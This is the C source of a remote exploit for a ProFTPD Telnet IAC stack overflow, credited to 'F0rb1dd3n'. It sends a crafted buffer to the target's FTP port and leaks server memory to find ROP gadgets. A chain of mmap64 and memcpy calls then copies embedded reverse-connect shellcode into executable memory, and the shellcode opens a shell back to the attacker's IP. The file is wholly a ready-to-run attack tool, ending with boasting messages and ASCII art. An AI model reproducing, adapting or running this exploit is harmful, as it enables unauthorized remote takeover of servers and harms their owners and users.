#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define OFFSET 4101
#define PADDING 34
#define WRITE 0x080532d8
#define MMAP64 0x08053d18
#define MEMCPY 0x080536c8

// reverse connection shellcode -> 95 bytes
// shellcode[31] to shellcode[34] is IP position
// shellcode[37] and shellcode[38] is PORT position (port 4444 by default)
char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90\x6a\x66"
                 "\x58\x6a\x01\x5b\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
                 "\x68\x7f\x7f\x7f\x7f\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a"
                 "\x10\x51\x50\x89\xe1\x89\xc6\x6a\x03\x5b\x6a\x66\x58\xcd\x80"
                 "\x87\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31"
                 "\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
                 "\x53\x89\xe1\xcd\x80";

char write_fd[]="\x01\x00\x00\x00";
char write_len[]="\xff\xff\x0f\x00";

char pop3ret[]="\x5e\x5f\x5d";
char large_popret[]="\x83\xc4\x20\x5b\x5e\x5d\xc3";

char junk[]="\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
            "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
            "\x41\x41\x41\x41";
                                      
                                      // shellcode copy routine:
char byte1[]="\xfc\x8b";              // FC             CLD
char byte2[]="\xf4";                  // 8BF4           MOV ESI,ESP
char byte3[]="\xbf";                  // BF 00010010    MOV EDI,10000100
char byte4[]="\x00\x01\x00";
char byte5[]="\x10";
char byte6[]="\xb9\x00\x02\x00\x00";  // B9 00020000    MOV ECX,200
char byte7[]="\xf3";                  // F3:A4          REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
char byte8[]="\xa4";
char byte9[]="\xeb\xff";              // EB FF       JMP +0xFF 

char mmap64_args[]="\x00\x00\x00\x10"
                   "\x00\x10\x00\x00"
                   "\x07\x00\x00\x00"
                   "\x32\x00\x00\x00"
                   "\xff\xff\xff\xff"
                   "\x00\x00\x00\x00"
                   "\x00\x00\x00\x00"
                   "\x00\x00\x00\x00"
                   "\x00\x00\x00\x00"
                   "\x00\x00\x00\x00"
                   "\x00\x00\x00\x00";

// A function to display an error message and then exit
void fatal(char *message) {
   char error_message[100];

   strcpy(error_message, "[!!] Fatal Error ");
   strncat(error_message, message, 83);
   perror(error_message);
   exit(-1);
}

// dumps raw memory in hex byte and printable split format
void dump(const unsigned char *data_buffer, const unsigned int length) {
   unsigned char byte;
   unsigned int i, j;
   for(i=0; i < length; i++) {
      byte = data_buffer[i];
      printf("%02x ", data_buffer[i]);  // display byte in hex
      if(((i%16)==15) || (i==length-1)) {
         for(j=0; j < 15-(i%16); j++)
            printf("   ");
         printf("| ");
         for(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line
            byte = data_buffer[j];
            if((byte > 31) && (byte < 127)) // outside printable char range
               printf("%c", byte);
            else
               printf(".");
         }
         printf("\n"); // end of the dump line (each line 16 bytes)
      } // end if
   } // end for
   printf("\n");
}

u_int indexOf(const unsigned char *data_buffer, const unsigned int length, 
   const unsigned char *needle, const unsigned int needlelen){
   u_int k;
   for(k=0; k < length - needlelen; k++){
      if(memcmp(data_buffer+k, needle, needlelen) == 0){
         return k;
      }
   }
}

int main(int argc, char *argv[]) {
   int sockfd;
   struct hostent *host_info;
   struct hostent *my_host_info;
   struct sockaddr_in target_addr;
   unsigned char buffer[OFFSET+1+PADDING+336+sizeof(shellcode)+11];
   unsigned char read_buffer[0xfffff];
   u_int value = (u_int) WRITE - (u_int) 59;
   u_int p3r = value;
   u_int lpr = value;
   u_int addr = value;
   u_int byte1_addr = value;
   u_int byte2_addr = value;
   u_int byte3_addr = value;
   u_int byte4_addr = value;
   u_int byte5_addr = value;
   u_int byte6_addr = value;
   u_int byte7_addr = value;
   u_int byte8_addr = value;
   u_int byte9_addr = value;

   if(argc < 2) {
      printf("\n\t Proftpd Telnet IAC remote stack overflow exploit\n");
      printf("\t Writen by: F0rb1dd3n\n");
      printf("\n\t Usage: %s <target IP> <your IP>\n\n", argv[0]);
      exit(1);
   }

   if((my_host_info = gethostbyname(argv[2])) == NULL)
      fatal("looking up your hostname");

   memcpy(shellcode+31, my_host_info->h_addr, my_host_info->h_length);

   if((host_info = gethostbyname(argv[1])) == NULL)
      fatal("looking up hostname");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(21);   
   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   memset(&(target_addr.sin_zero), '\0', 8); // zero the rest of the struct

   printf("\n\t Proftpd Telnet IAC remote stack overflow exploit\n");
   printf("\t Writen by: F0rb1dd3n\n");
   printf("\n\t Target: %s\n", argv[1]);

   printf("\n\t Trying write(2) offset: 0x%08x", WRITE);

   bzero(buffer, OFFSET+1+PADDING+22);                                    // zero out the buffer
   memcpy(buffer+OFFSET, "\xff", 1);                                      // triggering the vulnerability
   memcpy(buffer+OFFSET+1, junk, strlen(junk));                           // junk
   *((u_int *)(buffer+OFFSET+1+PADDING)) = WRITE;                         // write address
   memcpy(buffer+OFFSET+1+PADDING+4, "\xcc\xcc\xcc\xcc", 4);              // crash dummy
   memcpy(buffer+OFFSET+1+PADDING+8, write_fd, strlen(write_fd));         // fd for write
   *((u_int *)(buffer+OFFSET+1+PADDING+12)) = WRITE;                      // buffer for write
   memcpy(buffer+OFFSET+1+PADDING+16, write_len, strlen(write_len));      // lenght for write
   memcpy(buffer+OFFSET+1+PADDING+20, "\x0a\x0d", 2);                     // end of buffer

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server");

   write(sockfd, buffer, OFFSET+1+PADDING+22);
   bzero(read_buffer, sizeof(read_buffer));

   if(read(sockfd, read_buffer, 0xfffff) != 0) {
      printf("\n\t [+] Success on write(2)");
      close(sockfd);

      printf("\n\t [+] mmap64() is located at 0x%08x", MMAP64);
      printf("\n\t [+] memcpy() is located at 0x%08x", MEMCPY);
      printf("\n\n\t Attempting to read memory of the server...\n");

      // Trying to find Pop Ret location

      u_int index = indexOf(read_buffer, sizeof(read_buffer), pop3ret, sizeof(pop3ret)-1);
      if(index >= 0){
         p3r += (u_int) index;
         printf("\n\t [+] Pop3Ret is located at 0x%08x", p3r);
      } else {
         printf("\n\t [-] Fail! Could not find Pop3Ret!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), large_popret, sizeof(large_popret)-1);      
      if(index >= 0){
         lpr += (u_int) index;
         printf("\n\t [+] Large PopRet is located at 0x%08x", lpr);
      } else {
         printf("\n\t [-] Fail! Could not find Large PopRet!");
      }

      // Trying to find special bytes location to shellcode copy routine

      index = indexOf(read_buffer, sizeof(read_buffer), byte1, sizeof(byte1)-1);      
      if(index >= 0){
         byte1_addr += (u_int) index;
         printf("\n\t [+] Byte1 is located at 0x%08x", byte1_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte1!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte2, sizeof(byte2)-1);   
      if(index >= 0){
         byte2_addr += (u_int) index;
         printf("\n\t [+] Byte2 is located at 0x%08x", byte2_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte2!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte3, sizeof(byte3)-1);      
      if(index >= 0){
         byte3_addr += (u_int) index;
         printf("\n\t [+] Byte3 is located at 0x%08x", byte3_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte3!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte4, sizeof(byte4)-1);      
      if(index >= 0){
         byte4_addr += (u_int) index;
         printf("\n\t [+] Byte4 is located at 0x%08x", byte4_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte4!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte5, sizeof(byte5)-1);      
      if(index >= 0){
         byte5_addr += (u_int) index;
         printf("\n\t [+] Byte5 is located at 0x%08x", byte5_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte5!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte6, sizeof(byte6)-1);      
      if(index >= 0){
         byte6_addr += (u_int) index;
         printf("\n\t [+] Byte6 is located at 0x%08x", byte6_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte6!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte7, sizeof(byte7)-1);      
      if(index >= 0){
         byte7_addr += (u_int) index;
         printf("\n\t [+] Byte7 is located at 0x%08x", byte7_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte7!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte8, sizeof(byte8)-1);      
      if(index >= 0){
         byte8_addr += (u_int) index;
         printf("\n\t [+] Byte8 is located at 0x%08x", byte8_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte8!");
      }
      index = indexOf(read_buffer, sizeof(read_buffer), byte9, sizeof(byte9)-1);      
      if(index >= 0){
         byte9_addr += (u_int) index;
         printf("\n\t [+] Byte9 is located at 0x%08x", byte9_addr);
      } else {
         printf("\n\t [-] Fail! Could not find Byte9!");
      }
   } else {
      printf("\t [-] Fail! Wrong write(2) offset!\n");
      close(sockfd);
   }
   
   printf("\n\n\t Building exploit buffer...\n");

   bzero(buffer, sizeof(buffer));
   memcpy(buffer+OFFSET, "\xff", 1);
   memcpy(buffer+OFFSET+1, junk, strlen(junk));                                       
   *((u_int *)(buffer+OFFSET+1+PADDING)) = MMAP64;
   *((u_int *)(buffer+OFFSET+1+PADDING+4)) = lpr;                     
   memcpy(buffer+OFFSET+1+PADDING+8, mmap64_args, sizeof(mmap64_args));

   *((u_int *)(buffer+OFFSET+1+PADDING+52)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+56)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+60, "\x00\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+64)) = byte1_addr;
   memcpy(buffer+OFFSET+1+PADDING+68, "\x02\x00\x00\x00", 4); 

   *((u_int *)(buffer+OFFSET+1+PADDING+72)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+76)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+80, "\x02\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+84)) = byte2_addr;
   memcpy(buffer+OFFSET+1+PADDING+88, "\x01\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+92)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+96)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+100, "\x03\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+104)) = byte3_addr;
   memcpy(buffer+OFFSET+1+PADDING+108, "\x01\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+112)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+116)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+120, "\x04\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+124)) = byte4_addr;
   memcpy(buffer+OFFSET+1+PADDING+128, "\x03\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+132)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+136)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+140, "\x07\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+144)) = byte5_addr;
   memcpy(buffer+OFFSET+1+PADDING+148, "\x01\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+152)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+156)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+160, "\x08\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+164)) = byte6_addr;
   memcpy(buffer+OFFSET+1+PADDING+168, "\x05\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+172)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+176)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+180, "\x0d\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+184)) = byte7_addr;
   memcpy(buffer+OFFSET+1+PADDING+188, "\x01\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+192)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+196)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+200, "\x0e\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+204)) = byte8_addr;
   memcpy(buffer+OFFSET+1+PADDING+208, "\x01\x00\x00\x00", 4);

   *((u_int *)(buffer+OFFSET+1+PADDING+212)) = MEMCPY;       
   *((u_int *)(buffer+OFFSET+1+PADDING+216)) = p3r;                  
   memcpy(buffer+OFFSET+1+PADDING+220, "\x0f\x00\x00\x10", 4);
   *((u_int *)(buffer+OFFSET+1+PADDING+224)) = byte9_addr;
   memcpy(buffer+OFFSET+1+PADDING+228, "\x02\x00\x00\x00", 4);

   memcpy(buffer+OFFSET+1+PADDING+232, "\x00\x00\x00\x10", 4);
   memset(buffer+OFFSET+1+PADDING+236, '\x90', 205);
   memcpy(buffer+OFFSET+1+PADDING+336, shellcode, sizeof(shellcode)-1);
   memcpy(buffer+OFFSET+1+PADDING+336+sizeof(shellcode)+9, "\x0a\x0d", 2);

   printf("\n\t Too much 00 bytes + evil buffer:\n\n");
   dump(buffer+OFFSET-4, sizeof(buffer)-OFFSET+4);

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server");

   printf("\n\t Sending exploit buffer...\n");
   write(sockfd, buffer, sizeof(buffer));
   close(sockfd);

   printf("\n\t [+] Done! Enjoy your fucking shell!!!\n");
   printf("\n\n\t\t F0rb1dd3n wins!!!");
   printf("\n\t\t Flawless Victory\n");

   printf("\n   █████▒▄▄▄     ▄▄▄█████▓ ▄▄▄       ██▓     ██▓▄▄▄█████▓▓██   ██▓");
   printf("\n ▓██   ▒▒████▄   ▓  ██▒ ▓▒▒████▄    ▓██▒    ▓██▒▓  ██▒ ▓▒ ▒██  ██▒");
   printf("\n ▒████ ░▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ▒██░    ▒██▒▒ ▓██░ ▒░  ▒██ ██░");
   printf("\n ░▓█▒  ░░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░    ░██░░ ▓██▓ ░   ░ ▐██▓░");
   printf("\n ░▒█░    ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒░██████▒░██░  ▒██▒ ░   ░ ██▒▓░");
   printf("\n  ▒ ░    ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░░ ▒░▓  ░░▓    ▒ ░░      ██▒▒▒ ");
   printf("\n  ░       ▒   ▒▒ ░   ░      ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░    ░     ▓██ ░▒░ ");
   printf("\n  ░ ░     ░   ▒    ░        ░   ▒     ░ ░    ▒ ░  ░       ▒ ▒ ░░  ");
   printf("\n              ░  ░              ░  ░    ░  ░ ░            ░ ░     ");
   printf("\n                                                          ░ ░     ");
   printf("\n\n");
}
